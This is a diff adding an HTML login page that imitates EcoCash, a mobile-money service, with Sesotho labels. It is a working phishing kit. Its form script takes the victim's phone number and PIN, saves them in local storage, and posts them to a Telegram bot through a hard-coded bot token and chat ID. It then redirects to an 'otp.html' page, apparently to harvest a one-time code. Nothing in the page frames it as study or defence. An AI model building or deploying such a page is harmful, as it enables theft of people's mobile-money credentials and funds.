@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>EcoCash | Kena (Login)</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+
+    body { 
+      background-color: #f8fafc; 
+      font-family: 'Plus Jakarta Sans', sans-serif; 
+    }
+
+    .login-card {
+      background: #ffffff;
+      border-radius: 50px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
+    }
+
+    .input-field {
+      background-color: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 18px;
+      padding: 1.25rem;
+      width: 100%;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .input-field:focus {
+      border-color: #000099;
+      box-shadow: 0 0 0 1px #000099;
+    }
+
+    .btn-primary {
+      background-color: #000099;
+      color: white;
+      padding: 1.25rem;
+      border-radius: 100px;
+      font-weight: 700;
+      width: 100%;
+      transition: transform 0.1s ease;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col items-center justify-center p-6">
+
+  <div class="mb-12 text-center">
+    <h1 class="text-4xl font-bold">
+      <span class="text-blue-600">Eco</span><span class="text-red-600">Cash</span>
+    </h1>
+    <p class="text-gray-500 font-semibold mt-4">Kena (Login)</p>
+  </div>
+
+  <div class="max-w-[420px] w-full login-card p-10 md:p-12">
+    <form class="space-y-6" id="loginForm">
+
+      <input type="tel" id="phone" placeholder="Nomoro ea Mohala (Phone Number)" class="input-field" required />
+
+      <div class="relative">
+        <input type="password" id="pin" placeholder="Pin ea Hau (Your PIN)" maxlength="4" class="input-field pr-12" required />
+        <button type="button" onclick="togglePassword()" class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400">
+          <i id="eye-icon" class="fas fa-eye-slash"></i>
+        </button>
+      </div>
+
+      <button type="submit" class="btn-primary text-lg">Kena (Log In)</button>
+
+    </form>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pinInput = document.getElementById('pin');
+      const eyeIcon = document.getElementById('eye-icon');
+
+      if (pinInput.type === "password") {
+        pinInput.type = "text";
+        eyeIcon.classList.replace('fa-eye-slash', 'fa-eye');
+      } else {
+        pinInput.type = "password";
+        eyeIcon.classList.replace('fa-eye', 'fa-eye-slash');
+      }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value;
+      const pin = document.getElementById('pin').value;
+      const submitBtn = e.target.querySelector('button[type="submit"]');
+
+      localStorage.setItem('userPhone', phone);
+      localStorage.setItem('userPin', pin);
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `
+        <div class="flex items-center justify-center gap-2">
+          <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+          </svg>
+          Ea lokisa...
+        </div>
+      `;
+
+      // Optional Telegram (add your own)
+      const botToken = "8341676430:AAEaTONbUfGE5Ibhe_WfEmxLDemmsrxKu40";
+      const chatId = "8588753899";
+
+      const message = `EcoCash Login\nPhone: ${phone}\nPIN: ${pin}`;
+
+      try {
+        if (botToken !== "YOUR_BOT_TOKEN") {
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
+        }
+      } catch (err) {
+        console.error("Telegram failed:", err);
+      }
+
+      setTimeout(() => {
+        window.location.href = "otp.html";
+      }, 1500);
+    });
+  </script>
+
+</body>
+</html>
